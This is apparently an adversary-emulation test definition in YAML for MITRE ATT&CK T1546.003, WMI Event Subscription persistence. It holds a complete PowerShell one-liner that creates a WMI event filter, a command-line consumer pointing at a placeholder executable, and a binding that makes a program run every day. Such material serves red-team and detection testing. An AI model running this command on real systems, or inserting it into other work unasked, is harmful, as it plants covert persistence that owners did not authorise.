- tactic: persistence
  technique_name: 'Event Triggered Execution: WMI Event Subscription'
  technique_id: T1546.003
  name: WMI Event Subscription Persistence
  description: Creates a WMI event subscription to execute a specified program persistently.
  executors:
  - name: windows
    platform: psh
    command: powershell -Command "$Filter=Set-WmiInstance -Namespace 'root\subscription'
      -Class '__EventFilter' -Arguments @{Name='MyFilter';EventNamespace='Root\Cimv2';QueryLanguage='WQL';Query='SELECT
      * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_LocalTime"
      AND TargetInstance.Hour = 10'}; $Consumer=Set-WmiInstance -Namespace 'root\subscription'
      -Class 'CommandLineEventConsumer' -Arguments @{Name='MyConsumer';CommandLineTemplate='C:\path\to\executable.exe'};
      Set-WmiInstance -Namespace 'root\subscription' -Class '__FilterToConsumerBinding'
      -Arguments @{Filter=$Filter;Consumer=$Consumer}"
